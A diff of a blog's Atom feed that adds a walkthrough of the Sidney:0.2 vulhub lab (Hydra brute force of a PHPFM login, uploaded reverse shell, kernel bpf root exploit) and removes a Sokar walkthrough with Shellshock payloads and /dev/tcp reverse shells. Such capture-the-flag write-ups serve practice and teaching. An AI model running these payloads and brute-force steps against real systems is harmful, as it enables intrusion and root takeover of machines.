@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-26T15:16:48-05:00</updated>
+  <updated>2016-07-27T14:37:45-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,152 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Sidney:0.2]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/27/sidney-0-dot-2/"/>
+    <updated>2016-07-27T10:23:04-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/27/sidney-0-dot-2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Burp Suite</li>
+<li>Hydra</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/26474/">PHPFM Arbitrary File Upload</a></li>
+<li><a href="https://www.exploit-db.com/exploits/39772/">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/sidney2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.153 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.153 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 80 is opening.</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.41.153</code></p>
+
+<p>No useful info come out.</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.153/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p>still same thing.</p>
+
+<p>check the <a href="http://192.168.41.153,">http://192.168.41.153,</a> find a picture,</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the picture info:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a path:  <code>http://192.168.41.153/commodore64/</code></p>
+
+<p>now use nikto to scan that path,</p>
+
+<p><code>nikto -h http://192.168.41.153/commodore64/</code></p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an interesting file <code>index.php</code>,</p>
+
+<p>check that file,</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the login page, and the CMS seems PHPFM</p>
+
+<p><code>searchsploit PHPFM</code></p>
+
+<p>find a PHPFM Arbitrary File Upload, now I need to find a way to upload the shell. First, I have to get the access to the PHPFM</p>
+
+<p>In <code>http://192.168.41.153/commodore64</code>, I found:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I will try <code>robhubbard</code> as username. Password a C64 sound chip lowercase 3letters4digits without spaces&hellip; After checking wikipedia and more sites, seems that MOS is one of the sound chips (3 letters) Time to make our dictionary with MOS + 4 numbers and minimum+maximum of 7 words.</p>
+
+<p><code>crunch 7 7 -t mos%%%% &gt; test.txt</code></p>
+
+<p>before using hydra to crack password, I use Burp to get incorrect login response,</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<pre><code>hydra -l robhubbard -P test.txt 192.168.41.153 http-post-form "/commodore64/index.php:input_username=^USER^&amp;input_password=^PASS^:Login" -V
+</code></pre>
+
+<p>get the password <code>mos6518</code></p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>login, get the page:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>set up netcat and go to <code>http://192.168.41.153/commodore64/reverse.php</code></p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Since the Linux kernel version here is 4.4.0</p>
+
+<p><code>searchsploit 4.4 | grep linux</code></p>
+
+<p>exploit found <code>Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit</code></p>
+
+<p>In Kali:</p>
+
+<pre><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+cp 39772.zip /var/www/html/
+</code></pre>
+
+<p>In target:</p>
+
+<p>upload the 39772.zip via phpfm, in the shell</p>
+
+<p><code>find / -name 39772.zip</code></p>
+
+<p>shows the file in <code>/var/www/html/commodore64/</code></p>
+
+<pre><code>cd  /var/www/html/commodore64/
+unzip 39772.zip
+cd 39772
+tar xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit/
+./compile.sh
+./doubleput
+</code></pre>
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[stapler]]></title>
@@ -875,143 +1021,6 @@ gcc 37292.c -o 37292
 <p><code>hashcat -m 10 -a 0 -o joompass.txt --remove 61.hash /usr/share/wordlists/rockyou.txt</code></p>
 
 <p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[vulhub-sokar]]></title>
-    <link href="http://wg135.github.io/blog/2016/07/15/vulhub-sokar/"/>
-    <updated>2016-07-15T10:27:33-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/07/15/vulhub-sokar</id>
-    <content type="html"><![CDATA[<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Nikto</li>
-<li>User Agent Switcher</li>
-</ul>
-
-
-<h3>Vulnerability:</h3>
-
-<ul>
-<li><a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">shellshock(remote)</a></li>
-<li><a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">shellshock(local)</a></li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.56.103 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.56.103 -p-</code></p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>port 591 is opening, looks like it is running http service.</p>
-
-<p>use nikto to scan</p>
-
-<p><code>nikto -h 192.168.56.103:591</code></p>
-
-<p>nothing cool.</p>
-
-<p>Use wufzz to scan</p>
-
-<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.103/FUZZ 2&gt;/dev/null</code></p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>find an interesting path <code>cgi-bin</code>. Thats interesting, because it reminds shellshock.</p>
-
-<p>Use brower to check the web page</p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>The web page shows result of commands <code>netstat</code> and <code>iostat</code>.</p>
-
-<p>check the source code find the cgi path <code>/cgi-bin/cat</code></p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>start to verfiy shellshock:</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" "http://192.168.56.103:591/cgi-bin/cat"
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sokar/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>Confirmed.Also find two user names <code>bynarr</code> and <code>apophis</code></p>
-
-<p>I tried to upload reverse shell</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.56.102/4444 0&lt;&amp;1" "http://192.168.56.103:591/cgi-bin/cat"
-</code></pre>
-
-<p>failed. I guess because certain ports are allowed.</p>
-
-<p>keep going&hellip;</p>
-
-<p>check the files belong to bynarr:</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /usr/bin/find / -user bynarr " "http://192.168.56.103:591/cgi-bin/cat"
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sokar/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>Try to read each file I got, and find the <code>va/spool/mail/bynarr</code> is very interesting.</p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>so now I know I can only use port 51242 to setup reverse shell.</p>
-
-<p>Also I noticed that <code>.</code> is in environment variable <code>$PATH</code>, so that I can run a script in the current path firstly.</p>
-
-<p>write the reverse shell to iostat:</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/echo -e '#/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.102/51242 0&gt;&amp;1' &gt; /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
-</code></pre>
-
-<p>add the x attribute</p>
-
-<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/chmod +x /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
-</code></pre>
-
-<p>After serverl seconds I got shell:</p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>next run <code>sudo -l</code> to check allowed commands for bynarr</p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>so /home/bynarr/lime which is owned by root that bynarr can run.</p>
-
-<p>in order to check shell shock locally. run:</p>
-
-<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>
-
-<p>local shell shock works</p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>from the <code>sudo -l</code> output, there are many environment variables can be used. I ued USERNAME</p>
-
-<p><code>sudo USERNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>
-
-<p>get the shell:</p>
-
-<p><img src="/images/blog/vulhub/sokar/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
